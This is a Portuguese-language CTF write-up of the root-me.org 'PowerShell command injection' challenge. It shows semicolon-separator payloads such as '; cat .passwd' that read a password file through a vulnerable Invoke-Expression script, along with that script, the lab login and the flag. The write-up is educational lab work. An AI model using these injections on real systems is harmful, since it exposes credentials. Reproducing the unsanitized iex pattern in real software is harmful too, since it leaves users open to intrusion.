---
title: "Powershell - Injeção de Comandos - root-me.org"
date: 2023-12-06
published: true
lang: pt-BR
translation_key: "powershell-command-injection-root-me"
original_url: /powershell-command-injection-root-me
permalink: /pt-br/powershell-command-injection-root-me
---
# [](#intro)Introdução

Neste write-up, estamos tomando uma rota diferente, enfrentando uma máquina do Windows CTF. Este CTF está hospedado no [Root-me](https://www.root-me.org) na aba Script do aplicativo. Também é classificado como fácil! Vamos ver o que temos.

# [](#level-description)Challenge description

A «declaração» diz:

> Declaração

> Recuperar a senha do banco de dados.

Uma tarefa enigmática, de fato! Parece que temos de entrar na máquina para dar uma vista de olhos e perceber do que se trata este CTF. No entanto, antes de o fazer, vamos rever o Powershell e comandar a injeção para melhorar a nossa abordagem estratégica.

Para entrar na máquina, executamos o comando:

`ssh -p 2225 app-script-ch18@challenge05.root-me.org`

com a senha `app-script-ch18`.

# [](#approach)Aproxime-se da mentalidade

## [](#mindset-step1)Passo 1 - Compreendendo conceitos básicos

### Powershell 101

Primeiro, vamos discutir Powershell. Powershell serve como uma shell do Windows, semelhante a como Bash funciona no Linux (ou MacOS). Sucedendo ao shell 'CMD' mais antigo, o Powershell pode ser visto como uma versão aprimorada do CMD, oferecendo um conjunto de recursos mais robusto.

Em Powershell, numerosos comandos são semelhantes aos do TMC, mas também introduz uma infinidade de novos comandos exclusivos. Por exemplo, comandos como `ls`, `cat`, `mkdir` e `pwd` são integrados do Bash em Powershell.

Para uma introdução simplista, isso deve bastar. No entanto, se você estiver interessado em como nivelar o jogo Powershell, confira [este repositório github ](https://github.com/lllife-uncat/powershell-101/blob/master/PG_PowerShell_XWIPSCRE01_0.pdf). Ele contém um PDF cheio de insights sobre como ter sucesso usando esta shell!

- Injeção de comando.

A injeção de comando é um ataque cibernético que envolve executar comandos arbitrários em um sistema operacional host (OS). Em termos simples, uma vulnerabilidade à injeção de comando é aquela que o atacante interrompe o fluxo normal de um script, injetando um código arbitrário - geralmente não pretendido pelo desenvolvedor -. Esta forma de ataque é distinta de outros tipos de injeção de código, uma vez que visa especificamente execução de comando dentro do ambiente de um sistema operacional.

Para uma boa referência, confira a injeção de comando OWASP [page](https://owasp.org/www-community/attacks/Command_Injection). Demonstra como isso geralmente acontece dentro de um ambiente Unix.

## [](#mindset-step2)Passo 2 - Compreender o problema

Agora que apreendemos os conceitos básicos com os quais este desafio está envolvido, vamos entrar na máquina e dar uma olhada ao redor. Lembre-se, esta é uma máquina Powershell, então fique confortável trabalhando com comandos do Windows shell.

Aqui está a saudação que recebemos ao torcer:

```bash
ssh -p 2225 app-script-ch18@challenge05.root-me.org
      _           _ _                        ___  ____  
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ \| ___| 
 / __| '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \ | | |___ \ 
| (__| | | | (_| | | |  __/ | | | (_| |  __/ |_| |___) |
 \___|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|\___/|____/ 
                                 |___/ root-me.org      

app-script-ch18@challenge05.root-me.org's password: 
Table to dump:
```
Esta interface sugere que estamos interagindo com um programa de linha de comando ou script, em vez de estar diretamente no ambiente shell. Vamos digitar qualquer comando para ver o que acontece:

```bash
Table to dump:
> ls
Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AGQ
ALwBSAFAAagBxADkAYwBOAHgAegAyAEQAcgB2AGEAbgAvAFUAbgBYAHcAPQA9AHwAYwA5ADIANQAxAGQAYwA0AGYA
NgAzAGYAZQA4AGIAOQA4ADYAZQA1AGUAOAA0ADIAMwA2ADAANQAwAGMAOQAzADcAMgAzADYAMAAzADgAMQAyADkAZ
QA4AGMAMQBiADAAYQA4ADAAMAAxAGMAMQA1AGYAMABjADcAOABhADAAZgBlADkAYgAwADgAYQAwAGMAOQBiAGMAZg
A1ADkANgAyADcANQBmAGEAOAAzAGIAMwA1ADcAZQAzADYAOQBjAGYA. Backup the table ls
Table to dump:
>
```
Estamos dentro de uma interface de linha de comando. Nós não somos capazes de executar comandos Powershell, mas como o problema diz que temos injeção de comando, podemos precisar quebrar esta interface e acessar a shell. Este é o nosso objectivo!

Contexto

Esta interface de linha de comando pode ser algo assim, em powershell:

```powershell
Function Simulate-Interaction {
        while ($true) {
                Write-Host "Table to dump:"
                $input = Read-Host "> "

                Write-Host "Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AGQ
ALwBSAFAAagBxADkAYwBOAHgAegAyAEQAcgB2AGEAbgAvAFUAbgBYAHcAPQA9AHwAYwA5ADIANQAxAGQAYwA0AGYA
NgAzAGYAZQA4AGIAOQA4ADYAZQA1AGUAOAA0ADIAMwA2ADAANQAwAGMAOQAzADcAMgAzADYAMAAzADgAMQAyADkAZ
QA4AGMAMQBiADAAYQA4ADAAMAAxAGMAMQA1AGYAMABjADcAOABhADAAZgBlADkAYgAwADgAYQAwAGMAOQBiAGMAZg
A1ADkANgAyADcANQBmAGEAOAAzAGIAMwA1ADcAZQAzADYAOQBjAGYA. Backup the table $input"
        }
}

Simulate-Interaction
```
Para simular isso, vamos executar uma shell PS integrada dentro do nosso ambiente Linux:

```bash
PS /tmp/root-me> ./ps-ci.ps1
Table to dump:
> : test
Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AGQ
ALwBSAFAAagBxADkAYwBOAHgAegAyAEQAcgB2AGEAbgAvAFUAbgBYAHcAPQA9AHwAYwA5ADIANQAxAGQAYwA0AGYA
NgAzAGYAZQA4AGIAOQA4ADYAZQA1AGUAOAA0ADIAMwA2ADAANQAwAGMAOQAzADcAMgAzADYAMAAzADgAMQAyADkAZ
QA4AGMAMQBiADAAYQA4ADAAMAAxAGMAMQA1AGYAMABjADcAOABhADAAZgBlADkAYgAwADgAYQAwAGMAOQBiAGMAZg
A1ADkANgAyADcANQBmAGEAOAAzAGIAMwA1ADcAZQAzADYAOQBjAGYA. Backup the table test
```
Sim. Parece quase o mesmo que o CTF. Veja, uma vulnerabilidade de injeção de comando acontece quando nossa variável `$input` quebra o comando `Write-Host` e executa outro em vez disso. No nosso código, no entanto, isso não é possível, uma vez que `Write-Host` não é propenso a injeção de comando. No entanto, podemos pensar que o fluxo do script é semelhante a este. Para quebrar a string, usaríamos o tubo `;` em Powershell, que é o mesmo que dizer: hey PS, além do que você precisa executar, também executar o seguinte comando. Aqui está um exemplo:

```bash
PS /tmp/root-me> whoami; ls
kaizen
cinjection  cinjection.c  ps  ps-ci.ps1
```
## [](#mindset-step3)Passo 3 - Criando o ataque

Basicamente planeámos o nosso ataque no último passo. A ideia aqui é quebrar o `$input` que o script CTF Powershell leva com um ponto e vírgula `;` e passar um comando PS depois. Assim, o ataque inicial seria: `; ls`, por exemplo.

## [](#mindset-step4)Passo 4 - Resolvendo!

Vamos experimentar.

```bash
Table to dump:
> ; ls
Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8ADY
AbgBzADgAUQA4AG4AdwB3AGIAbgBNAFcAcgBYAE8AMgBWADkAQgB5AEEAPQA9AHwAYQA5ADcAZgAyAGIAOQA5ADIA
YQBkADIAYwA0ADQAYQA3AGYAMAAxADgAZgA2AGUAMgAzAGYAOQA0AGYAZQBmADkAOQBiADUAZQBkADAAZQAwAGUAO
AA3ADMAMAA1ADkAZQA0ADkAMAA0ADgANQA5ADIAZAA4ADQANgA2ADYAOQA0ADMAMQBlADMANQBjADEANAA0AGQAOQ
AyAGMAYgAyADQANAA2AGUAZAA2ADYANgA1ADYAMABhADYAYgAwADcA. Backup the table


    Directory: C:\cygwin64\challenge\app-script\ch18


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/12/2021   9:25 AM             43 .git
-a----       11/21/2021  11:34 AM            150 .key
-a----        4/20/2020  10:50 AM             18 .passwd
------       12/12/2021   9:50 AM            574 ._perms
------       11/21/2021  11:35 AM            348 ch18.ps1
```
Aha! Como esperado, poderíamos quebrar a entrada passando o tubo `;` com outro comando. Por curiosidade, vamos dar uma olhada no script `ch18.ps1` injetando `; cat ch18.ps1`:

```powershell
$key = Get-Content .key
$SecurePassword = Get-Content .passwd | ConvertTo-SecureString -AsPlainText -Force | Conv
ertFrom-SecureString -key $key

while($true) {
        Write-Host "Table to dump: "
        Write-Host -NoNewLine "> "
        $table=Read-Host

        iex "Write-Host Connect to the database With the secure Password: $SecurePassword
. Backup the table $table"
}
```
Incrível. Ele está usando `iex` CMDlet, que é o curto para o método `Invoke-Expression` usado para executar o código. É por isso que o subtítulo deste CTF é "Há UI, UX e IEX" xD

Para resolver este problema, simplesmente passamos o comando `; cat .passwd`:

```bash
Table to dump:
> ; cat .passwd
Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8ADY
AbgBzADgAUQA4AG4AdwB3AGIAbgBNAFcAcgBYAE8AMgBWADkAQgB5AEEAPQA9AHwAYQA5ADcAZgAyAGIAOQA5ADIA
YQBkADIAYwA0ADQAYQA3AGYAMAAxADgAZgA2AGUAMgAzAGYAOQA0AGYAZQBmADkAOQBiADUAZQBkADAAZQAwAGUAO
AA3ADMAMAA1ADkAZQA0ADkAMAA0ADgANQA5ADIAZAA4ADQANgA2ADYAOQA0ADMAMQBlADMANQBjADEANAA0AGQAOQ
AyAGMAYgAyADQANAA2AGUAZAA2ADYANgA1ADYAMABhADYAYgAwADcA. Backup the table
SecureIEXpassword
```
E aí está! A bandeira para este CTF é `SecureIEXpassword`.

# [](#conclusions)Conclusão

Nesta CTF, aprendemos um pouco mais sobre Powershell e injeção de comando. A tarefa foi simples – para recuperar uma senha de banco de dados dentro de um ambiente Windows.

Primeiro revisamos alguns conceitos de Powershell, bem como a definição de ataques de injeção de comando. A configuração CTF levou-nos a aproveitar o ponto e vírgula `;` em Powershell para adicionar e executar comandos adicionais. Aplicando esta técnica, injetamos com sucesso o comando dentro do ambiente.

Como podemos ver, este é um simples Powershell CTF. Mantendo a nossa abordagem consciente, não foi difícil encontrar uma saída para apanhar esta bandeira!

Obrigado por ficar até o fim. Espero que tenhas aprendido algo novo hoje! E lembre-se, sempre faça sua pesquisa **!

<a href="/">Voltar</a>





